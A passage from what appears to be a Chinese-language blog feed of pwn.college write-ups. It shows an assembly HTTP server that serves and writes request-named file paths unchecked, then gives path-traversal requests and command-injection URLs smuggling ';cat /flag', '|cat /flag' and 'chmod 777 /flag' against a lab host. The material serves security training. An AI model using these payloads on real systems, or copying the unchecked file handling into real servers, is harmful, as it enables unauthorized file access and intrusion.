endmark(%rip), %r8           # 结束标志    call find_get       movq %rsi, %r9    leaq contentlenbuffer(%rip), %rsi    movq $0, %rbxparse_content_length:      lodsb    cmpb $0x00, %al        # 比较当前字符是否为空格    je end_parse                       # 如果是0x00，则结束拷贝      subb $&#39;0&#39;, %al    imul $10, %rbx    add %al, %bl    jmp parse_content_lengthend_parse:    movq %rbx, contentlen(%rip)    movq %r9, %rsi    lea 3(%rsi), %rsi    leaq filecontent(%rip), %rdicopy_file:    lodsb    stosb    subq $1, %rbx    cmpq $0, %rbx    ja copy_file    # 打开文件    leaq filepath(%rip), %rdi    movq $0x41, %rsi    movq $0777, %rdx    movq $2, %rax    syscall    movq %rax, openfilefd(%rip)    # 写入文件内容    leaq filecontent(%rip), %rsi    movq %rax, %rdi    movq contentlen(%rip), %rdx    movq $1, %rax    syscall    # 关闭文件    movq $3, %rax    movq openfilefd(%rip), %rdi    syscall      # 写入响应1    movq clientfd(%rip), %rdi    leaq response(%rip), %rsi    # write(fd, response, size(response))    movq $19, %rdx    movq $1, %rax    syscall    # 子进程退出    movl $60, %eax               # 系统调用号: exit (60 in x86_64)    xorl %edi, %edi              # 返回代码0    syscall                      # 触发系统调用find_get:    movb $0, %al                      # 将 AL 初始化为 NULL 终止符    repe cmpsb                        # 比较 buffer 和 &quot;GET &quot;    je found_get                      # 如果找到了 &quot;GET &quot;, 跳转    leaq content_length_str(%rip), %rdi    movq %r10, %rcx    jmp find_getfound_get:    # 找到了 &quot;GET &quot;, 寻找下一个空格来分割路径    movq %rdx, %rdi         # rdi 指向 filepathcopy_path:    lodsb                             # 读取 buffer 的下一个字符到 al 中    cmpb endmark(%rip), %al        # 比较当前字符是否为空格    je end_copy                       # 如果是空格，则结束拷贝    stosb                             # 否则将字符存储到 filepath 中    incq %rcx                         # 增加 filepath 的计数器    cmpq $255, %rcx                   # 检查是否超过 filepath 缓冲区大小    jne copy_path                     # 如果没有，继续拷贝end_copy:    movb $0, %al                      # 将 NULL 终止符加到 filepath 末尾    stosb    retparent_process:    # 关闭这个客户端套接字    movq clientfd(%rip), %rdi    movq $3, %rax    syscall    jmp accept    # 退出    movl $60, %eax               # 系统调用号: exit (60 in x86_64)    xorl %edi, %edi              # 返回代码0    syscall                      # 触发系统调用# sockaddr_in 结构体sockaddr:    .short 0x0002                     # 地址族 (AF_INET)    .short 0x5000                # 端口号 (端口号80)    .long  0x00000000                     # IP地址 (INADDR_ANY, 绑定到任意地址)    .quad  0                     # 填充以达到16字节对齐<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>这个地方在建立连接之后，一直报错，结果是客户端发送过来的请求包的长度大于了服务器设置的缓冲器的长度。实际发送的长度是146，我第一开始设置的缓冲区的大小只是100</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> Trace: Parent Process <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">[</span>✓<span class="token punctuation">]</span> execve<span class="token punctuation">(</span><span class="token string">"/proc/self/fd/3"</span>, <span class="token punctuation">[</span><span class="token string">"/proc/self/fd/3"</span><span class="token punctuation">]</span>, 0x7fed1c3f0a10 /* <span class="token number">0</span> vars */<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">[</span>✓<span class="token punctuation">]</span> socket<span class="token punctuation">(</span>AF_INET, SOCK_STREAM, IPPROTO_IP<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">[</span>✓<span class="token punctuation">]</span> bind<span class="token punctuation">(</span><span class="token number">3</span>, <span class="token punctuation">&#123;</span>sa_family<span class="token operator">=</span>AF_INET, <span class="token assign-left variable">sin_port</span><span class="token operator">=</span>htons<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span>, <span class="token assign-left variable">sin_addr</span><span class="token operator">=</span>inet_addr<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>, <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">[</span>✓<span class="token punctuation">]</span> listen<span class="token punctuation">(</span><span class="token number">3</span>, <span class="token number">0</span><span class="token punctuation">)</span>                            <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">[</span>✓<span class="token punctuation">]</span> accept<span class="token punctuation">(</span><span class="token number">3</span>, NULL, NULL<span class="token punctuation">)</span>                   <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">[</span>✓<span class="token punctuation">]</span> read<span class="token punctuation">(</span><span class="token number">4</span>, <span class="token string">"GET / HTTP/1.1<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Host: localhost<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>User-Agent: python-requests/2.32.3<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Accept-Encoding: gzip, deflate, zstd<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Accept: */*<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Connection: keep-alive<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span>, <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">146</span><span class="token punctuation">[</span>✓<span class="token punctuation">]</span> write<span class="token punctuation">(</span><span class="token number">4</span>, <span class="token string">"HTTP/1.0 200 OK<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span>, <span class="token number">19</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">19</span><span class="token punctuation">[</span>✓<span class="token punctuation">]</span> close<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>                                <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">[</span>✓<span class="token punctuation">]</span> exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                                 <span class="token operator">=</span> ?<span class="token punctuation">[</span>?<span class="token punctuation">]</span> +++ exited with <span class="token number">0</span> +++<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.section .datadomain:    .int 2                # AF_INETtype:      .int 1                # SOCK_STREAMprotocol:  .int 0                # IPPROTO_IPsocketfd:  .quad 0               # socket_fdresponse:  .asciz &quot;HTTP&#x2F;1.0 200 OK\r\n\r\n&quot;buffer:    .space 1000  # 就是这里，第一开我设置的是100.section .text.global _start_start:    # 创建套接字    movl $2, %edi                # 第一个参数: domain (AF_INET)    movl $1, %esi                # 第二个参数: type (SOCK_STREAM)    movl $0, %edx                # 第三个参数: protocol (IPPROTO_IP)    movl $41, %eax               # 系统调用号: socket (41 in x86_64)    syscall                      # 触发系统调用    # 保存套接字描述符    movq %rax, %rdi              # 将返回的文件描述符保存在rdi中    movq %rax, socketfd(%rip)          # 将文件描述符保存在socketfd中    # 准备sockaddr_in结构    movq $16, %rdx               # 第三个参数: struct sockaddr的长度    leaq sockaddr(%rip), %rsi    # 第二个参数: struct sockaddr指针    # 绑定套接字    movl $49, %eax               # 系统调用号: bind (49 in x86_64)    syscall                      # 触发系统调用    # 监听    movq $0, %rsi               # listen(socket_fd, max_listen_num)    movq $0x32, %rax             # 系统调用号 listen    syscall                      # 触发系统调用    # 创建连接    movq $0x2B, %rax            # accept(socket_fd, address, addrlen)    xor %rdx, %rdx    xor %rsi, %rsi    syscall    # 读取响应    movq %rax, %rdi    leaq buffer(%rip), %rsi    # read(fd, response, size(response))    movq $1000, %rdx    movq $0, %rax    syscall    # 写入响应    leaq response(%rip), %rsi    # write(fd, response, size(response))    movq $19, %rdx    movq $1, %rax    syscall      # 关闭这个套接字    movq $3, %rax    syscall    # 退出    movl $60, %eax               # 系统调用号: exit (60 in x86_64)    xorl %edi, %edi              # 返回代码0    syscall                      # 触发系统调用# sockaddr_in 结构体sockaddr:    .short 0x0002                     # 地址族 (AF_INET)    .short 0x5000                # 端口号 (端口号80)    .long  0x00000000                     # IP地址 (INADDR_ANY, 绑定到任意地址)    .quad  0                     # 填充以达到16字节对齐<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.section .datadomain:    .int 2                # AF_INETtype:      .int 1                # SOCK_STREAMprotocol:  .int 0                # IPPROTO_IPsocketfd:  .quad 0               # socketfdclientfd:  .quad 0               # clientfdopenfilefd:  .quad 0              # openfilefdfilecontentlen:  .quad 0              # filecontentlenresponse:  .asciz &quot;HTTP&#x2F;1.0 200 OK\r\n\r\n&quot;responsefile:  .space 1000           # 文件请求中文件内容缓冲区filecontent:  .space 1000           # 文件请求中文件内容缓冲区filepath: .space 256            # 字符串长度buffer:    .space 1000           # 请求数据包缓冲区get_str:   .asciz &quot;GET &quot;         # &quot;GET &quot;字符串space_char: .byte &#39; &#39;            # 空格字符.section .text.global _start_start:    # 创建套接字    movl $2, %edi                # 第一个参数: domain (AF_INET)    movl $1, %esi                # 第二个参数: type (SOCK_STREAM)    movl $0, %edx                # 第三个参数: protocol (IPPROTO_IP)    movl $41, %eax               # 系统调用号: socket (41 in x86_64)    syscall                      # 触发系统调用    # 保存套接字描述符    movq %rax, %rdi              # 将返回的文件描述符保存在rdi中    movq %rax, socketfd(%rip)          # 将文件描述符保存在socketfd中    # 准备sockaddr_in结构    movq $16, %rdx               # 第三个参数: struct sockaddr的长度    leaq sockaddr(%rip), %rsi    # 第二个参数: struct sockaddr指针    # 绑定套接字    movl $49, %eax               # 系统调用号: bind (49 in x86_64)    syscall                      # 触发系统调用listen:    # 监听    movq socketfd(%rip), %rdi    movq $0, %rsi                # listen(socketfd, max_listen_num)    movq $0x32, %rax             # 系统调用号 listen    syscall                      # 触发系统调用accept:    # 创建连接    movq $0x2B, %rax            # accept(socketfd, address, addrlen)    xor %rdx, %rdx    xor %rsi, %rsi    movq socketfd(%rip), %rdi    syscall    movq  %rax, clientfd(%rip)    # 创建子进程    movq $57, %rax             # 系统调用号 fork    syscall    testq %rax, %rax    jnz parent_process    call handle_clienthandle_client:    # 在子进程中关闭socketfd文件描述符    movq socketfd(%rip), %rdi    movq $3, %rax    syscall    # 读取响应    movq clientfd(%rip), %rdi    leaq buffer(%rip), %rsi    # read(fd, response, size(response))    movq $1000, %rdx    movq $0, %rax    syscall    # 初始化指针和寄存器    leaq buffer(%rip), %rsi           # rsi 指向 buffer    leaq filepath(%rip), %rdi         # rdi 指向 filepath    movq $0, %rcx                     # 用来计数 filepath 的长度    movb $0, %al                      # 将 AL 初始化为 NULL 终止符find_get:    movq $4, %rcx                     # 需要匹配 &quot;GET &quot; 的长度    leaq get_str(%rip), %rdi          # rdi 指向 &quot;GET &quot; 字符串find_loop:    repe cmpsb                        # 比较 buffer 和 &quot;GET &quot;    je found_get                      # 如果找到了 &quot;GET &quot;, 跳转    jmp find_get                      # 否则继续查找found_get:    # 找到了 &quot;GET &quot;, 寻找下一个空格来分割路径    leaq filepath(%rip), %rdi         # rdi 指向 filepathcopy_path:    lodsb                             # 读取 buffer 的下一个字符到 al 中    cmpb space_char(%rip), %al        # 比较当前字符是否为空格    je end_copy                       # 如果是空格，则结束拷贝    stosb                             # 否则将字符存储到 filepath 中    incq %rcx                         # 增加 filepath 的计数器    cmpq $255, %rcx                   # 检查是否超过 filepath 缓冲区大小    jne copy_path                     # 如果没有，继续拷贝end_copy:    movb $0, %al                      # 将 NULL 终止符加到 filepath 末尾    stosb    # 打开文件    leaq filepath(%rip), %rdi    movq $0, %rsi    movq $0, %rdx    movq $2, %rax    syscall    movq %rax, openfilefd(%rip)    # 读取文件    leaq filecontent(%rip), %rsi    movq %rax, %rdi    movq $1000, %rdx    movq $0, %rax    syscall    movq %rax, filecontentlen(%rip)    # 关闭文件    movq $3, %rax    movq openfilefd(%rip), %rdi    syscall      # 写入响应1    movq clientfd(%rip), %rdi    leaq response(%rip), %rsi    # write(fd, response, size(response))    movq $19, %rdx    movq $1, %rax    syscall    # 写入响应2    movq clientfd(%rip), %rdi    leaq filecontent(%rip), %rsi    # write(fd, response, size(response))    movq filecontentlen(%rip), %rdx    movq $1, %rax    syscall    # 子进程退出    movq clientfd(%rip), %rdi    movq $3, %rax    syscall    movl $60, %eax               # 系统调用号: exit (60 in x86_64)    xorl %edi, %edi              # 返回代码0    syscall                      # 触发系统调用parent_process:    # 关闭这个客户端套接字    movq clientfd(%rip), %rdi    movq $3, %rax    syscall    jmp accept    # 退出    movl $60, %eax               # 系统调用号: exit (60 in x86_64)    xorl %edi, %edi              # 返回代码0    syscall                      # 触发系统调用# sockaddr_in 结构体sockaddr:    .short 0x0002                     # 地址族 (AF_INET)    .short 0x5000                # 端口号 (端口号80)    .long  0x00000000                     # IP地址 (INADDR_ANY, 绑定到任意地址)    .quad  0                     # 填充以达到16字节对齐<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-College-Web-3-Writeup</title>
      <link href="/2024/09/04/pwn-college-web-3-writeup/"/>
      <url>/2024/09/04/pwn-college-web-3-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h1><p><a href="https://pwn.college/intro-to-cybersecurity/web-security/">https://pwn.college/intro-to-cybersecurity/web-security/</a></p><h2 id="有价值的问题"><a href="#有价值的问题" class="headerlink" title="有价值的问题"></a>有价值的问题</h2><h3 id="1-命令行参数的拼接"><a href="#1-命令行参数的拼接" class="headerlink" title="1. 命令行参数的拼接"></a>1. 命令行参数的拼接</h3><h4 id="1"><a href="#1" class="headerlink" title="1. |"></a>1. |</h4><p><code>ls -l . | wc -l</code> 将前一个命令的直接结果作为第二个命令的输入</p><h4 id="2-amp"><a href="#2-amp" class="headerlink" title="2. &amp;"></a>2. &amp;</h4><p><code>ls -l . &amp; ls -l .</code>使前一个命令可以在后台执行，这样可以不用等待第一个命令的执行结果的情况下，执行第二个命令，不会阻塞第二个命令。</p><h4 id="3-和-amp"><a href="#3-和-amp" class="headerlink" title="3. `` 和 &amp;"></a>3. `` 和 &amp;</h4><p>两种方式中<code>ls -l .</code>的输出中包含的换行符会被替代为空白字符。</p><p><strong>echo `ls -l .`</strong>, 将<code>ls -l .</code>的输出结果作为一个值，返回到当前上下文中。</p><p><code>echo $(ls -l .)</code> 这种命令执行的方式和上面这种命令执行的方式是一样的</p><h4 id="4-传入换行符"><a href="#4-传入换行符" class="headerlink" title="4. 传入换行符"></a>4. 传入换行符</h4><p><code>echo Test \n cat flag</code> 在换行符之后，会被当作新的指令进行执行。第一开始我居然没有看到<code>\r</code> 和 <code>\n</code>有对应的url编码。这里的<code>\n</code>指输入的换行符，就跟普通的shell执行命令是一样的。</p><p>在 URL 中传递换行符，可以使用 URL 编码来表示换行符。常见的换行符有两种形式：</p><ol><li><strong><code>\n</code></strong> (Line Feed, LF，换行符) 的 URL 编码是 **<code>%0A</code>**。</li><li><strong><code>\r</code></strong> (Carriage Return, CR，回车符) 的 URL 编码是 **<code>%0D</code>**。</li></ol><h4 id="5-r和-n的区别"><a href="#5-r和-n的区别" class="headerlink" title="5. \r和\n的区别"></a>5. \r和\n的区别</h4><p><code>Carriage Return</code> (<code>\r</code>) 和 <code>Line Feed</code> (<code>\n</code>) 是两种不同的控制字符，它们最早在打印机和文本处理系统中被用于表示文本的格式控制。两者的主要区别在于它们的历史使用背景以及它们如何在不同系统中被使用。</p><h5 id="1-r-Carriage-Return-："><a href="#1-r-Carriage-Return-：" class="headerlink" title="1. **\r (Carriage Return)**："></a>1. **<code>\r</code> (Carriage Return)**：</h5><ul><li>**回车符 (Carriage Return, CR)**，字符编码为 **<code>%0D</code>**。</li><li>它最早用于打字机，表示<strong>将光标移回到行首</strong>，但不换行。</li><li>在某些操作系统（例如早期的 Mac OS）中，**<code>\r</code> 单独用作换行符**。</li></ul><h5 id="2-n-Line-Feed-："><a href="#2-n-Line-Feed-：" class="headerlink" title="2. **\n (Line Feed)**："></a>2. **<code>\n</code> (Line Feed)**：</h5><ul><li>**换行符 (Line Feed, LF)**，字符编码为 **<code>%0A</code>**。</li><li>它用于<strong>将光标移到下一行</strong>，但不回到行首。</li><li>在 Unix 和类 Unix 系统（例如 Linux 和 macOS 的现代版本）中，**<code>\n</code> 用作换行符**。</li></ul><h5 id="组合使用："><a href="#组合使用：" class="headerlink" title="组合使用："></a>组合使用：</h5><p>在很多现代系统中，<code>\r</code> 和 <code>\n</code> 被组合使用：</p><ul><li>**<code>\r\n</code>**：表示回到行首并换行，通常用于 <strong>Windows 系统</strong>。在 Windows 的文本文件中，一行的结束符是 <code>\r\n</code>。</li><li><strong><code>\n</code><strong>：在 <strong>Unix/Linux 系统</strong> 中，</strong>表示换行并自动回到行首</strong>，<code>\n</code> 是常见的行结束符。</li></ul><h5 id="URL-编码的区别："><a href="#URL-编码的区别：" class="headerlink" title="URL 编码的区别："></a>URL 编码的区别：</h5><ul><li><strong><code>\r</code> 的 URL 编码</strong> 是 **<code>%0D</code>**。</li><li><strong><code>\n</code> 的 URL 编码</strong> 是 **<code>%0A</code>**。</li><li><strong><code>\r\n</code> 的组合</strong> 在 URL 中就是 **<code>%0D%0A</code>**，这表示回车后换行。</li></ul><h5 id="使用场景："><a href="#使用场景：" class="headerlink" title="使用场景："></a>使用场景：</h5><ol><li>在网络通信中：<ul><li>一些网络协议（如 HTTP、SMTP）使用 <code>\r\n</code> 来分隔行，例如 HTTP 的请求头和响应头就是通过 <code>\r\n</code> 结束每一行的。</li></ul></li><li>操作系统的文件格式：<ul><li>Windows 使用 <code>\r\n</code> 作为行结束符。</li><li>Unix/Linux 系统使用 <code>\n</code> 作为行结束符。</li></ul></li></ol><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ul><li><code>\r</code> 和 <code>\n</code> 源于不同的系统和历史背景，分别代表<strong>回车</strong>和<strong>换行</strong>操作。</li><li>在现代系统中，<strong>Windows</strong> 通常使用 <code>\r\n</code> 组合表示换行，而 <strong>Unix/Linux</strong> 系统只使用 <code>\n</code>。</li><li>在 URL 编码中，<code>\r</code> 和 <code>\n</code> 分别被编码为 <code>%0D</code> 和 <code>%0A</code>，它们的组合是 <code>%0D%0A</code>。</li></ul><h3 id="2-跨域的请求，是否要先向目的服务器发送option数据包"><a href="#2-跨域的请求，是否要先向目的服务器发送option数据包" class="headerlink" title="2. 跨域的请求，是否要先向目的服务器发送option数据包"></a>2. 跨域的请求，是否要先向目的服务器发送option数据包</h3><p>是的，跨域请求的确通常会在实际请求之前，先向目的服务器发送一个 <strong><code>OPTIONS</code></strong> 请求。这就是所谓的 <strong>CORS 预检请求</strong>（CORS Preflight Request）。浏览器在处理跨域请求时，使用 <code>OPTIONS</code> 请求来检查服务器是否允许跨域，并确认所需的 HTTP 方法和头是否被接受。</p><p><strong>跨域请求的预检请求</strong></p><p>跨域请求的流程如下：</p><ol><li><p>预检请求（Preflight Request）：</p><ul><li>当浏览器检测到跨域请求（例如请求的目标域与当前网页的域不同），且该请求不属于“简单请求”（例如请求使用了自定义头或方法，如 <code>PUT</code> 或 <code>DELETE</code>），浏览器会首先发出一个 <code>OPTIONS</code> 请求，询问服务器是否允许该跨域请求。</li><li><code>OPTIONS</code> 请求并不会携带实际数据，它只是用于确认服务器是否允许特定的跨域操作。</li></ul></li><li><p>服务器响应：</p><ul><li><p>服务器需要正确地处理 </p><pre class="line-numbers language-none"><code class="language-none">OPTIONS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 请求，并返回允许跨域的头信息，例如：</p><ul><li><code>Access-Control-Allow-Origin</code>: 定义允许跨域的来源（可以是 <code>*</code> 表示所有域名）。</li><li><code>Access-Control-Allow-Methods</code>: 指定允许的 HTTP 方法，如 <code>GET</code>, <code>POST</code>, <code>PUT</code> 等。</li><li><code>Access-Control-Allow-Headers</code>: 列出允许使用的自定义头。</li></ul></li></ul></li><li><p>实际请求：</p><ul><li>如果服务器正确响应了预检请求，并且允许跨域，浏览器才会继续发送实际的请求（例如 <code>GET</code>, <code>POST</code> 等），并带上实际数据。</li></ul></li></ol><h2 id="Path-Traversal-2"><a href="#Path-Traversal-2" class="headerlink" title="Path Traversal 2"></a>Path Traversal 2</h2><p><code>Path Traversal</code>, 第一开始我是用curl去请求，发现他总是会把我请求的路径给改掉。由于浏览器或者命令行工具（如 curl）会对 URL 进行规范化处理，在实际请求到达 Flask 应用之前，URL 中的路径部分会被自动解析并规范化。比如:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http:/challenge.localhost/flag/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/flag --<span class="token operator">></span> 它会自动给处理成/flaghacker@web-security~path-traversal-2:~$ <span class="token function">curl</span> http://challenge.localhost/fortunes/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/flag<span class="token operator">&lt;</span><span class="token operator">!</span>doctype html<span class="token operator">></span><span class="token operator">&lt;</span>html <span class="token assign-left variable">lang</span><span class="token operator">=</span>en<span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token number">404</span> Not Found<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>></span>Not Found<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token operator">&lt;</span>p<span class="token operator">></span>No /challenge/files/flag from directory /home/hacker<span class="token operator">&lt;</span>/p<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以还是要用echo + nc 的方式发最原始的http报文。这里一定要注意http报文的格式，新的头部字段前是没有空格的，直接用\r\n分割开就行了。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">""</span>"GET fortunes/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/flag HTTP/1.1<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token punctuation">\</span>Host: challenge.localhost<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token punctuation">\</span><span class="token string">""</span>" <span class="token operator">|</span> <span class="token function">nc</span> challenge.localhost <span class="token number">80</span><span class="token comment"># echo -e "GET /index.html HTTP/1.1\r\n\</span><span class="token comment"># Host: challenge.localhost\r\n\r\n" | nc challenge.localhost 80</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CMDi-1"><a href="#CMDi-1" class="headerlink" title="CMDi 1"></a>CMDi 1</h2><p>利用传参构建，<br><code>curl  http://challenge.localhost/?directory=/%3Bcat%20/flag</code></p><h2 id="CMDi-2"><a href="#CMDi-2" class="headerlink" title="CMDi 2"></a>CMDi 2</h2><p>这个不是利用<code>;</code>了，是利用 <code>|</code>将前面一个命令的执行结果作为下一个命令的初始输入。</p><p><code>curl http://challenge.localhost/?directory=/%7ccat%20/flag</code></p><h2 id="CMDi-3"><a href="#CMDi-3" class="headerlink" title="CMDi 3"></a>CMDi 3</h2><p>跟SQL注入有点像，拼接闭合字符串。</p><p><code>curl http://challenge.localhost/?directory=/%27%20%3bcat%20%27/flag</code></p><h2 id="CMDi-5"><a href="#CMDi-5" class="headerlink" title="CMDi 5"></a>CMDi 5</h2><p>这一关只告诉你执行的指令是什么？但并没有指令的回显。那可以修改flag文件的权限，然后自己查看。</p><p><code>curl http://challenge.localhost/?filepath=1%3bchmod%20777%20/flag</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/opt/pwn.college/python</span><span class="token keyword">import</span> subprocess<span class="token keyword">import</span> flask<span class="token keyword">import</span> osapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filepath <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"filepath"</span><span class="token punctuation">,</span> <span class="token 